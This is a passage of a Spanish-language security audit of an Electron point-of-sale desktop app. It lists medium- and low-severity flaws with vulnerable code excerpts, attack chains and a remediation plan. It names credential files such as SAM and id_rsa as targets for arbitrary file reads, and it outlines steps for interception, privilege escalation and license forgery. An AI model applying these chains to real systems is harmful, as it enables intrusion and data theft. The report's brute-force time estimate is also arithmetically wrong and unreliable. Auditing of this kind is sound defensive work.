**Archivo:** `dist-electron/main/core/auth/handlers.js`  
**Líneas:** 59-87  
**Categoría:** Validación Insuficiente

#### Código Vulnerable

```javascript
// handlers.js
const fields = [];
const values = [];
if (data.data.rol !== undefined) {
    fields.push('rol = ?');
    values.push(data.data.rol);  // ← No se re-valida contra el enum
}
db.prepare(`UPDATE usuarios SET ${fields.join(', ')} WHERE id = ?`).run(...values);
```

#### Descripción Detallada

Aunque existe un schema Zod que define `rol: z.enum(['admin', 'cajero'])`, el handler no re-valida después del schema. Si se bypassa la validación Zod (a través del invoke genérico CRIT-01), se podría insertar un valor no válido en el campo `rol`.

---

### MED-03: Feedback Handler Envía Contenido del Usuario a la API de Telegram

**Severidad:** MEDIA  
**CVSS Estimado:** 5.0  
**Archivo:** `dist-electron/main/modules/shared/feedback.js`  
**Líneas:** 16-27  
**Categoría:** Inyección de Contenido

#### Código Vulnerable

```javascript
// feedback.js
const texto = [
    '📩 *Feedback TOG Admin*',
    `Versión: ${electron_1.app.getVersion()}`,
    data.contacto ? `Contacto: ${data.contacto}` : '',
    '',
    data.mensaje.trim(),
].filter(Boolean).join('\n');

const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    body: JSON.stringify({ chat_id: chatId, text: texto, parse_mode: 'Markdown' }),
});
```

#### Descripción Detallada

El contenido del usuario (`data.mensaje`, `data.contacto`) se envía directamente a la API de Telegram con `parse_mode: 'Markdown'`. Problemas:

1. **Inyección de Markdown** - El usuario puede formatear mensajes para parecer legítimos
2. **Spam** - No hay rate limiting, se puede inundar el canal
3. **Token expuesto en URL** - El bot token aparece en la cadena de la URL

---

### MED-04: Claves API de Odds/Racing Almacenadas en BD y Retornadas al Renderer

**Severidad:** MEDIA  
**CVSS Estimado:** 5.0  
**Archivo:** `dist-electron/main/modules/hipico/odds-api.js`  
**Líneas:** 37-45  
**Categoría:** Exposición de Datos Sensibles

#### Código Vulnerable

```javascript
// odds-api.js
function leerConfigOdds(db) {
    const config = obtenerConfig(db);
    return {
        api_key: config.apiKey,      // ← Retornada al renderer
        api_base: config.apiBase,
        configurado: !!config.apiKey,
    };
}
```

#### Descripción Detallada

Las claves API para servicios externos se almacenan en la tabla `configuracion` de SQLite y se retornan al renderer a través de IPC. Con el invoke genérico (CRIT-01), cualquiera puede extraer estas claves.

---

### MED-05: Backup Restore Acepta Ruta de Archivo del Renderer sin Validación de Path Traversal

**Severidad:** MEDIA  
**CVSS Estimado:** 5.0  
**Archivo:** `dist-electron/main/modules/configuracion/backup.js`  
**Líneas:** 67-118  
**Categoría:** Path Traversal

#### Código Vulnerable

```javascript
// backup.js
(0, ipc_guard_1.handleIpc)('backup:restore', async (_event, data) => {
    let sourcePath = data?.ruta;
    // ... solo verifica magic number de SQLite ...
    fs_1.default.copyFileSync(sourcePath, dbPath);
});
```

#### Descripción Detallada

El handler acepta una ruta de archivo del renderer y la copia a la ubicación de la base de datos. No hay validación contra path traversal. Un atacante podría:

1. Apuntar a la base de datos de otra aplicación
2. Sobrescribir archivos de configuración
3. Inyectar una base de datos SQLite maliciosa

---

### MED-06: Comunicación Serial sin Validación de Path del Puerto

**Severidad:** MEDIA  
**CVSS Estimado:** 4.8  
**Archivo:** `dist-electron/main/services/printer.js`  
**Líneas:** 55-106  
**Categoría:** Validación Insuficiente

#### Código Vulnerable

```javascript
// printer.js
async function enviarEscPos(bytes, opciones) {
    const puerto = (opciones?.puerto || '').trim();
    port = new SerialPort({ path: puerto, baudRate: opciones.baudRate || 9600, autoOpen: false });
}
```

#### Descripción Detallada

El path del puerto serial no se valida contra una whitelist. Un usuario podría especificar cualquier path de dispositivo, potencialmente escribir bytes arbitrarios a dispositivos del sistema.

---

### MED-07: `productos:import-csv` Lee Archivos Arbitrarios del Sistema

**Severidad:** MEDIA  
**CVSS Estimado:** 4.8  
**Archivo:** `dist-electron/main/modules/inventario/csv.js`  
**Líneas:** 49-54  
**Categoría:** Lectura de Archivos Arbitrarios

#### Código Vulnerable

```javascript
// csv.js
(0, ipc_guard_1.handleIpc)('productos:import-csv', async (_event, filePath, data) => {
    const content = fs_1.default.readFileSync(filePath, 'utf8');
});
```

#### Descripción Detallada

El handler acepta un `filePath` del renderer y lee su contenido. Aunque el contenido se parsea como CSV, la lectura del archivo ocurre independientemente de si el parseo es exitoso. Un atacante puede leer archivos como:

- `C:\Windows\System32\config\SAM`
- `C:\Users\<user>\.ssh\id_rsa`
- Cualquier archivo legible por el proceso

---

### MED-08: Crash Reports sin Sanitización de Contenido

**Severidad:** MEDIA  
**CVSS Estimado:** 4.5  
**Archivo:** `dist-electron/main/services/crash-reporter.js`  
**Líneas:** 158-166  
**Categoría:** Inyección de Contenido

#### Código Vulnerable

```javascript
// crash-reporter.js
function saveCrashReport(data) {
    const report = buildReport(data);
    const filename = `${report.id}.txt`;
    const filePath = path_1.default.join(dir, filename);
    const content = formatReportText(report);
    fs_1.default.writeFileSync(filePath, content, 'utf8');
}
```

#### Descripción Detallada

El canal `crash-report:save` es PREAUTH (sin autenticación). Los campos controlados por el usuario se escriben directamente a disco sin sanitización. Esto puede usarse para:

1. Llenar el disco con archivos basura (denegación de servicio)
2. Inyectar información falsa en los reportes
3. Crear archivos con nombres maliciosos (aunque el ID se genera server-side)

---

### MED-09: Inconsistencia de Autenticación en Crash Reports

**Severidad:** MEDIA  
**CVSS Estimado:** 4.3  
**Archivo:** `dist-electron/main/modules/crash-report/handlers.js`  
**Categoría:** Lógica de Autenticación Inconsistente

#### Código Vulnerable

```javascript
// save - SIN autenticación
(0, ipc_guard_1.handleIpc)('crash-report:save', async (_event, data) => {
    const filePath = (0, crash_reporter_1.saveCrashReport)({ ... });
    return { success: true, path: filePath };
});

// read - CON autenticación
(0, ipc_guard_1.handleIpc)('crash-report:read', async (_event, data) => {
    const fail = (0, auth_1.checkPermissionOrFail)(data, 'crash-report:read', 'config_access');
    if (fail) return fail;
});

// delete - CON autenticación
(0, ipc_guard_1.handleIpc)('crash-report:delete', async (_event, data) => {
    const fail = (0, auth_1.checkPermissionOrFail)(data, 'crash-report:delete', 'config_delete');
    if (fail) return fail;
});
```

#### Descripción Detallada

`crash-report:save` no requiere autenticación pero `read` y `delete` sí. Esta inconsistencia permite crear archivos arbitrarios sin login.

---

## 7. Vulnerabilidades Bajas

---

### LOW-01: Sentencias `console.log/error` en Código de Producción

**Severidad:** BAJA  
**CVSS Estimado:** 3.1  
**Archivo:** `dist-electron/main/services/updater.js`  
**Líneas:** 83, 88  
**Categoría:** Información Expuesta

#### Código

```javascript
console.error('[Updater] Error:', err.message);
console.log('[Updater] No hay actualización disponible');
```

#### Descripción

Los `console.log` y `console.error` en el main process escriben a stdout/stderr que podría ser capturado en logs del sistema. Aunque estas instancias específicas no contienen datos sensibles, indican un patrón de logging de desarrollo dejado en producción.

---

### LOW-02: Generación de IDs de Crash Report con `Math.random()`

**Severidad:** BAJA  
**CVSS Estimado:** 3.0  
**Archivo:** `dist-electron/main/services/crash-reporter.js`  
**Línea:** 52  
**Categoría:** Criptografía Débil

#### Código

```javascript
const random = Math.random().toString(36).substring(2, 6);
```

#### Descripción

Los IDs de crash report usan `Math.random()` que no es criptográficamente seguro. Un atacante podría predecir y sobrescribir archivos de reporte.

---

### LOW-03: Certificado TLS Auto-Firmado con Validez de 5 Años

**Severidad:** BAJA  
**CVSS Estimado:** 2.8  
**Archivo:** `dist-electron/main/services/red-cert.js`  
**Líneas:** 13-14  
**Categoría:** Criptografía Débil

#### Código

```javascript
exports.CERT_VALIDITY_DAYS = 365 * 5;  // 5 años
exports.CERT_KEY_SIZE = 2048;
```

#### Descripción

El certificado TLS auto-firmado tiene una validez excesiva (5 años) y usa claves RSA de 2048 bits. Para certificados auto-generados, se recomienda:
- Validez máxima de 1 año
- Claves de 4096 bits o curves ECC

---

### LOW-04: Rate Limiting del Endpoint de Emparejamiento Basado en IP y Fácilmente Bypasseable

**Severidad:** BAJA  
**CVSS Estimado:** 2.5  
**Archivo:** `dist-electron/main/services/red-server.js`  
**Líneas:** 41-56  
**Categoría:** Controles de Acceso Débiles

#### Código

```javascript
const RATE_LIMIT_WINDOW_MS = 60000;  // 1 minuto
const RATE_LIMIT_MAX = 5;            // 5 intentos por minuto
const vincularAttempts = new Map();  // Estado en memoria
```

#### Descripción

El rate limiting:
- Se basa en IP (trivialmente spoofable con proxies)
- Resetea cada 60 segundos
- Se pierde al reiniciar la aplicación
- El código de emparejamiento es de 6 caracteres (26^6 = ~309M combinaciones)
- A 5 intentos/minuto, se necesitarían ~3.5 años para fuerza bruta

Aunque el riesgo es bajo, el rate limiting no es una protección significativa.

---

### LOW-05: CSP Redundante - Meta Tag HTML y Headers de Electron Session

**Severidad:** BAJA  
**CVSS Estimado:** 2.0  
**Archivo:** `dist-electron/main/index.js` (Líneas 174-182), `dist/index.html` (Línea 7)  
**Categoría:** Configuración

#### Descripción

El CSP se define tanto en un meta tag HTML como en los headers de Electron session. El CSP a nivel de session sobreescribe el meta tag, pero tener ambos crea confusión de mantenimiento y posibles inconsistencias.

---

## 8. Buenas Prácticas Encontradas

A pesar de las vulnerabilidades, la aplicación implementa correctamente varias medidas de seguridad:

| Práctica | Estado | Detalle |
|----------|--------|---------|
| `contextIsolation: true` | ✅ | Aísla el contexto del renderer del Node.js |
| `nodeIntegration: false` | ✅ | No expone Node.js directamente al renderer |
| `sandbox: true` | ✅ | Habilita el sandbox de Chromium |
| `ipcMain.handle` / `ipcRenderer.invoke` | ✅ | Patrón correcto de IPC (vs. el inseguro `send`/`on`) |
| SQL parametrizado | ✅ | Usa `better-sqlite3` con `?` parameters - no hay SQL injection |
| Hash de passwords con bcrypt | ✅ | 10 salt rounds - apropiado para almacenamiento |
| Protección contra brute-force | ✅ | Bloqueo progresivo (5/10/30 intentos) |
| Validación con Zod | ✅ | Schemas para validación de inputs IPC |
| Single-instance lock | ✅ | Previene múltiples instancias de la app |
| Validación de filenames en crash reports | ✅ | Regex `SAFE_FILENAME_RE` para prevenir path traversal |
| TLS requerido en producción | ✅ | El server lanza error sin cert TLS en modo empaquetado |
| Sender validation | ✅ | `isTrustedSender()` verifica URL origin en `ipc-guard.js` |

---

## 9. Mapa de Amenazas

### 9.1 Vectores de Ataque Identificados

```
┌─────────────────────────────────────────────────────────────────┐
│                    MAPA DE AMENAZAS                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  EXTERNO                                                        │
│  ├── Red Local (LAN)                                            │
│  │   ├── Man-in-the-Middle (CRIT-05)                           │
│  │   ├── RPC sin auth (CRIT-04, HIGH-02)                       │
│  │   └── Emparejamiento malicioso (HIGH-08)                    │
│  ├── Internet                                                   │
│  │   └── Servidor expuesto en 0.0.0.0 (HIGH-01)               │
│  └── Dependencias npm                                           │
│      └── Supply chain attack (via CRIT-01)                      │
│                                                                  │
│  INTERNO                                                        │
│  ├── Renderer Process                                           │
│  │   ├── XSS → invoke genérico (CRIT-01)                       │
│  │   ├── Cualquier usuario = admin (CRIT-02)                    │
│  │   └── Lectura de archivos (MED-05, MED-07)                  │
│  ├── Main Process                                               │
│  │   ├── Password admin expuesto (CRIT-03, CRIT-04)            │
│  │   ├── .env con secrets (HIGH-07)                            │
│  │   └── Config manipulation (MED-01)                          │
│  └── Archivos Locales                                           │
│      ├── admin-initial-password.txt (CRIT-03)                   │
│      └── license.json falsificable (HIGH-05)                   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 9.2 Cadenas de Ataque

#### Cadena 1: Acceso Total desde la Red Local

```
1. PC atacante se empareja con Base PC (HIGH-08)
2. Llama a license:initial-password (CRIT-04)
3. Obtiene contraseña admin
4. Hace login como admin
5. Usa invoke genérico para acceder a todo (CRIT-01)
6. Exporta base de datos completa
```

#### Cadena 2: Escalada de Privilegios Local

```
1. Atacante logra XSS en la UI (MED-03, HIGH-04)
2. Usa invoke genérico (CRIT-01)
3. Se hace pasar por usuario ID 1 (CRIT-02)
4. Crea usuario admin backdoor
5. Resetear BD o exportar datos
```

#### Cadena 3: Intercepción de Datos

```
1. ARP spoofing en la LAN
2. TLS sin verificar permite MITM (CRIT-05)
3. Intercepta credenciales de login
4. Accede al servidor RPC
5. Exporta datos financieros y de clientes
```

#### Cadena 4: Falsificación de Licencia

```
1. Obtener MAC address del target (fácil, es visible en red)
2. Calcular HMAC key (HIGH-05)
3. Crear license.json con datos modificados
4. Sobrescribir el archivo local
5. Licencia extendida o desbloqueada
```

---

## 10. Plan de Remediación

### 10.1 Prioridad Inmediata (Semana 1)

| # | Acción | Vulnerabilidad | Esfuerzo |
|---|--------|----------------|----------|
| 1 | Eliminar `invoke` genérico de preload.js | CRIT-01 | Bajo |
| 2 | Implementar validación de sesión server-side | CRIT-02 | Alto |
| 3 | Eliminar `license:initial-password` de PREAUTH | CRIT-04 | Bajo |
| 4 | Habilitar `rejectUnauthorized: true` siempre | CRIT-05 | Bajo |
| 5 | Eliminar archivo admin-initial-password.txt después de uso | CRIT-03 | Bajo |

### 10.2 Prioridad Alta (Semanas 2-3)

| # | Acción | Vulnerabilidad | Esfuerzo |
|---|--------|----------------|----------|
| 6 | Vincular servidor a IP local específica | HIGH-01 | Bajo |
| 7 | Agregar whitelist de canales RPC | HIGH-02 | Medio |
| 8 | Eliminar `webSecurity: false` y `allowRunningInsecureContent: true` | HIGH-03 | Bajo |
| 9 | Restringir `connect-src` a dominios específicos | HIGH-04 | Bajo |
| 10 | Generar HMAC key con `crypto.randomBytes()` | HIGH-05 | Bajo |
| 11 | Usar `crypto.randomBytes()` para passwords | HIGH-06 | Bajo |
| 12 | Mover secrets a Windows Credential Manager | HIGH-07 | Alto |
| 13 | Reducir canales PREAUTH al mínimo | HIGH-08 | Medio |

### 10.3 Prioridad Media (Semanas 4-6)

| # | Acción | Vulnerabilidad | Esfuerzo |
|---|--------|----------------|----------|
| 14 | Implementar whitelist de keys en `config:set` | MED-01 | Bajo |
| 15 | Validar enum `rol` en el handler | MED-02 | Bajo |
| 16 | Sanitizar contenido de feedback antes de enviar | MED-03 | Bajo |
| 17 | No retornar API keys al renderer | MED-04 | Medio |
| 18 | Validar paths en backup restore | MED-05 | Bajo |
| 19 | Whitelist de puertos serial | MED-06 | Bajo |
| 20 | Validar paths en CSV import | MED-07 | Bajo |
| 21 | Sanitizar contenido de crash reports | MED-08 | Bajo |
| 22 | Agregar auth a `crash-report:save` | MED-09 | Bajo |

### 10.4 Prioridad Baja (Semanas 7-8)

| # | Acción | Vulnerabilidad | Esfuerzo |
|---|--------|----------------|----------|
| 23 | Remover `console.log/error` de producción | LOW-01 | Bajo |
| 24 | Usar `crypto.randomBytes()` para crash report IDs | LOW-02 | Bajo |
| 25 | Reducir validez del cert TLS a 1 año | LOW-03 | Bajo |
| 26 | Mejorar rate limiting (persistente, no IP-based) | LOW-04 | Medio |
| 27 | Consolidar CSP en un solo lugar | LOW-05 | Bajo |

---

## 11. Anexos

### Anexo A: Lista Completa de Canales IPC

La aplicación registra 255+ canales IPC. Los más críticos:

```
auth:login, auth:logout, auth:change-password
usuarios:create, usuarios:update, usuarios:delete, usuarios:list
db:reset, db:backup, db:export
config:get, config:set, config:delete
ventas:create, ventas:list, ventas:export
productos:create, productos:update, productos:delete, productos:list, productos:import-csv
clientes:create, clientes:update, clientes:delete, clientes:list
proveedores:create, proveedores:update, proveedores:delete, proveedores:list
cajas:open, cajas:close, cajas:list
reportes:ventas, reportes:productos, reportes:clientes
license:status, license:validate, license:import, license:initial-password
red:status, red:vincular, red:desvincular, red:heartbeat
backup:create, backup:restore, backup:list
impresora:ticket, impresora:test
odds-api:config, odds-api:sports, odds-api:odds
feedback:send
crash-report:save, crash-report:read, crash-report:delete
```

### Anexo B: Stack Tecnológico

```
Runtime:          Electron (Chromium-based)
Backend:          Node.js
Frontend:         HTML/CSS/JavaScript (framework UI no identificado)
Database:         SQLite via better-sqlite3
Auth:             bcryptjs (passwords), sessions in-memory
Network:          HTTP/HTTPS (Node.js http/https modules)
Serial:           SerialPort (impresoras térmicas)
Updates:          electron-updater (GitHub Releases)
Notifications:    Telegram Bot API
Validation:       Zod schemas
License:          HMAC-SHA256 (basado en MAC address)
```

### Anexo C: Variables de Entorno

```env
# REDACTADO 2026-09-17: el informe imprimía el token real en claro. Los valores
# viven solo en el backend (landing-page → /api/feedback), nunca en un documento.
TELEGRAM_BOT_TOKEN=<redactado>
TELEGRAM_CHAT_ID=<redactado>
```

### Anexo D: Dependencias Críticas

```
electron:         Framework desktop
better-sqlite3:   Database driver (native module)
bcryptjs:         Password hashing
serialport:       Serial communication
node-fetch/https: HTTP requests
dotenv:           Environment variable loading
zod:              Schema validation
electron-updater: Auto-update mechanism
```

### Anexo E: Referencias

- OWASP Top 10 2021: https://owasp.org/Top10/
- Electron Security Checklist: https://www.electronjs.org/docs/latest/tutorial/security
- CWE-287: Improper Authentication
- CWE-862: Missing Authorization
- CWE-798: Use of Hard-coded Credentials
- CWE-327: Use of a Broken or Risky Cryptographic Algorithm
- CWE-295: Improper Certificate Validation
- CWE-22: Path Traversal
- CWE-918: Server-Side Request Forgery

---

**Fin del Informe**

*Generado por auditoría de seguridad automatizada - 17 de Septiembre de 2026*
